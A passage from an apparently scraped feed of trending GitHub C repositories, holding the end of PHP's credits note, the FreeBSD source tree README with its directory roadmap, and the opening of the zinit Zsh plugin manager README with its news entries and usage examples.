&lt;h2&gt;&lt;a id="user-content-credits" class="anchor" aria-hidden="true" href="#credits"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Credits&lt;/h2&gt;
&lt;p&gt;For the list of people who've put work into PHP, please see the
&lt;a href="https://php.net/credits.php" rel="nofollow"&gt;PHP credits page&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>php</author><guid isPermaLink="false">https://github.com/php/php-src</guid><pubDate>Tue, 04 Feb 2020 00:15:00 GMT</pubDate></item><item><title>freebsd/freebsd #16 in C, This week</title><link>https://github.com/freebsd/freebsd</link><description>&lt;p&gt;&lt;i&gt;FreeBSD src tree (read-only mirror)&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h2&gt;&lt;a id="user-content-freebsd-source" class="anchor" aria-hidden="true" href="#freebsd-source"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FreeBSD Source:&lt;/h2&gt;
&lt;p&gt;This is the top level of the FreeBSD source directory.  This file
was last revised on:
$FreeBSD$&lt;/p&gt;
&lt;p&gt;FreeBSD is an operating system used to power modern servers,
desktops, and embedded platforms. A large community has
continually developed it for more than thirty years. Its
advanced networking, security, and storage features have
made FreeBSD the platform of choice for many of the
busiest web sites and most pervasive embedded networking
and storage devices.&lt;/p&gt;
&lt;p&gt;For copyright information, please see the file COPYRIGHT in this
directory. Additional copyright information also exists for some
sources in this tree - please see the specific source directories for
more information.&lt;/p&gt;
&lt;p&gt;The Makefile in this directory supports a number of targets for
building components (or all) of the FreeBSD source tree.  See build(7), config(8),
&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/makeworld.html" rel="nofollow"&gt;https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/makeworld.html&lt;/a&gt;, and
&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/kernelconfig.html" rel="nofollow"&gt;https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/kernelconfig.html&lt;/a&gt;
for more information, including setting make(1) variables.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-source-roadmap" class="anchor" aria-hidden="true" href="#source-roadmap"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source Roadmap:&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;bin		System/user commands.

cddl		Various commands and libraries under the Common Development
		and Distribution License.

contrib		Packages contributed by 3rd parties.

crypto		Cryptography stuff (see crypto/README).

etc		Template files for /etc.

gnu		Various commands and libraries under the GNU Public License.
		Please see gnu/COPYING* for more information.

include		System include files.

kerberos5	Kerberos5 (Heimdal) package.

lib		System libraries.

libexec		System daemons.

release		Release building Makefile &amp;amp; associated tools.

rescue		Build system for statically linked /rescue utilities.

sbin		System commands.

secure		Cryptographic libraries and commands.

share		Shared resources.

stand		Boot loader sources.

sys		Kernel sources.

sys/&amp;lt;arch&amp;gt;/conf Kernel configuration files. GENERIC is the configuration
		used in release builds. NOTES contains documentation of
		all possible entries.

tests		Regression tests which can be run by Kyua.  See tests/README
		for additional information.

tools		Utilities for regression testing and miscellaneous tasks.

usr.bin		User commands.

usr.sbin	System administration commands.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For information on synchronizing your source tree with one or more of
the FreeBSD Project's development branches, please see:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/current-stable.html" rel="nofollow"&gt;https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/current-stable.html&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>freebsd</author><guid isPermaLink="false">https://github.com/freebsd/freebsd</guid><pubDate>Tue, 04 Feb 2020 00:16:00 GMT</pubDate></item><item><title>zdharma/zinit #17 in C, This week</title><link>https://github.com/zdharma/zinit</link><description>&lt;p&gt;&lt;i&gt;Flexible Zsh plugin manager with clean fpath, reports, completion management, turbo mode, annexes, services, packages&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a href="https://www.paypal.me/ZdharmaInitiative" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/d6bbee78d610b9d7c300d515e9d6d78d879e59d7/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d446f6e6174652d79656c6c6f772e7376673f6c6f6e6743616368653d74727565267374796c653d666f722d7468652d6261646765" alt="paypal" data-canonical-src="https://img.shields.io/badge/-Donate-yellow.svg?longCache=true&amp;amp;style=for-the-badge" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;amp;hosted_button_id=D54B3S7C6HGME" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/bce14c8e2e39ba0464551b34602b4c60c182526b/68747470733a2f2f7777772e70617970616c6f626a656374732e636f6d2f656e5f55532f692f62746e2f62746e5f646f6e6174655f4c472e676966" alt="paypal" data-canonical-src="https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://www.patreon.com/psprint" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/7030366454b936b1db9ddd95af0882caccabd194/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d50617472656f6e2d6f72616e67652e7376673f6c6f6e6743616368653d74727565267374796c653d666f722d7468652d6261646765" alt="patreon" data-canonical-src="https://img.shields.io/badge/-Patreon-orange.svg?longCache=true&amp;amp;style=for-the-badge" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;br&gt;New: You can request a feature when donating, even fancy or advanced ones get implemented this way. &lt;a href="DONATIONS.md"&gt;There are
reports&lt;/a&gt; about what is being done with the money received.&lt;/p&gt;
&lt;h2 align="center"&gt;&lt;a id="user-content-the-project-undergoes-a-name-change-from-zplugin-to-zinit" class="anchor" aria-hidden="true" href="#the-project-undergoes-a-name-change-from-zplugin-to-zinit"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;The project undergoes a name change from Zplugin to Zinit.&lt;/h2&gt;
&lt;h2 align="center"&gt;&lt;a id="user-content-please-report-any-observed-issues" class="anchor" aria-hidden="true" href="#please-report-any-observed-issues"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Please report any observed issues.&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/zdharma/zinit" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1ad253895e256949e208c481ab80fdb08a95dddc/68747470733a2f2f7472617669732d63692e6f72672f7a646861726d612f7a696e69742e7376673f6272616e63683d6d6173746572" alt="Status" data-canonical-src="https://travis-ci.org/zdharma/zinit.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="./LICENSE"&gt;&lt;img src="https://camo.githubusercontent.com/890acbdcb87868b382af9a4b1fac507b9659d9bf/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4d49542d626c75652e737667" alt="MIT License" data-canonical-src="https://img.shields.io/badge/license-MIT-blue.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://github.com/zdharma/zinit/releases"&gt;&lt;img src="https://camo.githubusercontent.com/2af43f1448bf8c3e4a23f896c5e3457dd511d4c3/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f7461672f7a646861726d612f7a696e69742e737667" alt="" data-canonical-src="https://img.shields.io/github/tag/zdharma/zinit.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/01fc177fb531a116255dd4e1937a78e1873a228b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f792f7a646861726d612f7a696e69742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/01fc177fb531a116255dd4e1937a78e1873a228b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f792f7a646861726d612f7a696e69742e737667" alt="" data-canonical-src="https://img.shields.io/github/commit-activity/y/zdharma/zinit.svg" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a href="https://gitter.im/zdharma/zinit?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c54a31d91510766b0e6c0b7584ec67c3dd1cb431/68747470733a2f2f6261646765732e6769747465722e696d2f7a646861726d612f7a696e69742e737667" alt="Join the chat at https://gitter.im/zdharma/zinit" data-canonical-src="https://badges.gitter.im/zdharma/zinit.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;  &lt;em&gt;generated with &lt;a href="https://github.com/thlorenz/doctoc"&gt;DocToc&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#news"&gt;News&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#zinit"&gt;Zinit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#zinit-wiki"&gt;Zinit Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#installation"&gt;Installation&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#option-1---automatic-installation-recommended"&gt;Option 1 - Automatic Installation (Recommended)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#option-2---manual-installation"&gt;Option 2 - Manual Installation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#usage"&gt;Usage&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#example-usage"&gt;Example Usage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ice-modifiers"&gt;Ice Modifiers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#zinit-commands"&gt;Zinit Commands&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#updating-zinit-and-plugins"&gt;Updating Zinit and Plugins&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#using-oh-my-zsh-themes"&gt;Using Oh My Zsh Themes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#completions"&gt;Completions&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#calling-compinit-without-turbo-mode"&gt;Calling &lt;code&gt;compinit&lt;/code&gt; Without Turbo Mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#calling-compinit-with-turbo-mode"&gt;Calling &lt;code&gt;compinit&lt;/code&gt; With Turbo Mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ignoring-compdefs"&gt;Ignoring Compdefs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#disabling-system-wide-compinit-call-ubuntu"&gt;Disabling System-Wide &lt;code&gt;compinit&lt;/code&gt; Call (Ubuntu)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#zinit-module"&gt;Zinit Module&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#motivation"&gt;Motivation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#installation-1"&gt;Installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#measuring-time-of-sources"&gt;Measuring Time of &lt;code&gt;source&lt;/code&gt;s&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#debugging"&gt;Debugging&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#hints-and-tips"&gt;Hints and Tips&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#customizing-paths"&gt;Customizing Paths&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#non-github-local-plugins"&gt;Non-GitHub (Local) Plugins&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#extending-git"&gt;Extending Git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#preinstalling-plugins"&gt;Preinstalling Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#getting-help-and-community"&gt;Getting Help and Community&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1&gt;&lt;a id="user-content-news" class="anchor" aria-hidden="true" href="#news"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;News&lt;/h1&gt;
&lt;details&gt;
  &lt;summary&gt;Here are the new features and updates added to zinit in the last 90 days.&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;21-01-2020&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A few tips for the project rename following the field reports (the issues created
by users):
&lt;ul&gt;
&lt;li&gt;the &lt;code&gt;ZPLGM&lt;/code&gt; hash is now &lt;code&gt;ZINIT&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;the annexes are moved under &lt;a href="https://github.com/zinit-zsh"&gt;zinit-zsh&lt;/a&gt;
organization (it needs a logo, could you create one, if you're skilled in
graphics?).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;19-01-2020&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The name has been changed to &lt;strong&gt;Zinit&lt;/strong&gt; based on the results of the
&lt;a href="https://github.com/zdharma/zinit/issues/235"&gt;poll&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;In general, you don't have to do anything after the name change.&lt;/li&gt;
&lt;li&gt;Only a run of &lt;code&gt;zinit update --all&lt;/code&gt; might be necessary.&lt;/li&gt;
&lt;li&gt;You might also want to rename your &lt;code&gt;zplugin&lt;/code&gt; calls in &lt;code&gt;zshrc&lt;/code&gt; to &lt;code&gt;zinit&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Zinit will reuse &lt;code&gt;~/.zplugin&lt;/code&gt; directory if it exists, otherwise it'll create
&lt;code&gt;~/.zinit&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;15-01-2020&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There's a new function, &lt;code&gt;zpextract&lt;/code&gt;, which unpacks the given file. It supports many
formats (notably also &lt;code&gt;dmg&lt;/code&gt; images) – if there's a format that's unsupported please
don't hesitate to &lt;a href="https://github.com/zdharma/zinit/issues/new?template=feature_request.md"&gt;make a
request&lt;/a&gt;
for it to be added. A few facts:
&lt;ul&gt;
&lt;li&gt;the function is available only at the time of the plugin/snippet installation,&lt;/li&gt;
&lt;li&gt;it's to be used within &lt;code&gt;atclone&lt;/code&gt; and &lt;code&gt;atpull&lt;/code&gt; ices,&lt;/li&gt;
&lt;li&gt;it has an optional &lt;code&gt;--move&lt;/code&gt; option which moves all the files from a subdirectory
up one level,&lt;/li&gt;
&lt;li&gt;one other option &lt;code&gt;--norm&lt;/code&gt; prevents the archive from being deleted upon unpacking.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;snippets now aren't re-downloaded unless they're newer on the HTTP server; use
this with the &lt;code&gt;--norm&lt;/code&gt; option of &lt;code&gt;zpextract&lt;/code&gt; to prevent unnecessary updates; for
example, the &lt;a href="https://github.com/Zsh-Packages/firefox-dev"&gt;firefox-dev package&lt;/a&gt;
uses this option for this purpose,&lt;/li&gt;
&lt;li&gt;GitHub doesn't report proper &lt;code&gt;Last-Modified&lt;/code&gt; HTTP server for the files in the
repositories so the feature doesn't yet work with such files.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;13-12-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The packages have been disconnected from NPM registry and now live only on Zsh
Packages organization. Publishing to NPM isn't needed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There are two interesting packages,
&lt;a href="https://github.com/Zsh-Packages/any-gem"&gt;any-gem&lt;/a&gt; and
&lt;a href="https://github.com/Zsh-Packages/any-node"&gt;any-node&lt;/a&gt;. They allow to install any
Gem(s) or Node module(s) locally in a newly created plugin directory. For example:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit pack param=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;GEM -&amp;gt; rails&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; any-gem
zinit pack param=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;MOD -&amp;gt; doctoc&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; any-node
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; To have the command in zshrc, add an id-as'' ice so that&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Zinit knows that the package is already installed&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; (also: the Unicode arrow is allowed)&lt;/span&gt;
zinit id-as=jekyll pack param=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;GEM → jekyll&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; any-gem&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The binaries will be exposed without altering the PATH via shims
(&lt;a href="https://github.com/zinit-zsh/z-a-bin-gem-node"&gt;Bin-Gem-Node&lt;/a&gt; annex is needed).
Shims are correctly removed when deleting a plugin with &lt;code&gt;zinit delete …&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;11-12-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Zinit now supports installing special-Zsh NPM packages! Bye-bye the long and
complex ice-lists! Check out the
&lt;a href="http://zdharma.org/zinit/wiki/NPM-Packages/" rel="nofollow"&gt;Wiki&lt;/a&gt; for an introductory document
on the feature.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;25-11-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A new subcommand &lt;code&gt;run&lt;/code&gt; that executes a command in the given plugin's directory. It
has an &lt;code&gt;-l&lt;/code&gt; option that will reuse the previously provided plugin. So that it's
possible to do:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zplg run my/plugin ls
zplg run -l cat &lt;span class="pl-cce"&gt;\*&lt;/span&gt;.plugin.zsh
zplg run -l &lt;span class="pl-c1"&gt;pwd&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;07-11-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Added a prefix-char: &lt;code&gt;@&lt;/code&gt; that can be used before plugins if their name collides
with one of the ice-names. For example &lt;code&gt;sharkdp/fd&lt;/code&gt; collides with the &lt;code&gt;sh&lt;/code&gt; ice
(which causes the plugin to be loaded with the POSIX &lt;code&gt;sh&lt;/code&gt; emulation applied). To
load it, do e.g.:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;null&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid from&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;gh-r&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; \
    mv&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;exa* -&amp;gt; exa&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; sbin&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;exa&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;  ogham/exa \
    mv&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;fd* -&amp;gt; fd&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; sbin&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;fd/fd&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;  @sharkdp/fd \
    sbin&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;fzf&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; junegunn/fzf-bin&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;i.e.: precede the plugin name with &lt;code&gt;@&lt;/code&gt;. Note: &lt;code&gt;sbin''&lt;/code&gt; is an ice added by the
&lt;a href="https://github.com/zinit/z-a-bin-gem-node"&gt;z-a-bin-gem-node&lt;/a&gt; annex, it provides
the command to the command line without altering &lt;code&gt;$PATH&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;See the &lt;a href="http://zdharma.org/zinit/wiki/For-Syntax/" rel="nofollow"&gt;Zinit Wiki&lt;/a&gt; for more
information on the for-syntax.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;06-11-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A new syntax, called for-syntax. Example:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt; zinit as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atload&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;print Hi!&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;for&lt;/span&gt; \
     atinit&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;print First!&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; zdharma/null \
     atinit&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;print Second!&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; svn OMZ::plugins/git&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;First!
Hi!
Second!
Hi!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And also:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;% print -rl &lt;span class="pl-smi"&gt;$path&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt; egrep -i &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;(/git|null)&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
/root/.zinit/snippets/OMZ::plugins/git
/root/.zinit/plugins/zdharma---null&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To load in light mode, use a new &lt;code&gt;light-mode&lt;/code&gt; ice. More examples and information
can be found on the &lt;a href="http://zdharma.org/zinit/wiki/For-Syntax/" rel="nofollow"&gt;Zinit Wiki&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;03-11-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A new value for the &lt;code&gt;as''&lt;/code&gt; ice – &lt;code&gt;null&lt;/code&gt;. Specifying &lt;code&gt;as"null"&lt;/code&gt; is like specifying
&lt;code&gt;pick"/dev/null" nocompletions&lt;/code&gt;, i.e.: it disables the sourcing of the default
script file of a plugin or snippet and also disables the installation of
completions.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;30-10-2019&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A new ice &lt;code&gt;trigger-load''&lt;/code&gt; – create a function that loads given plugin/snippet,
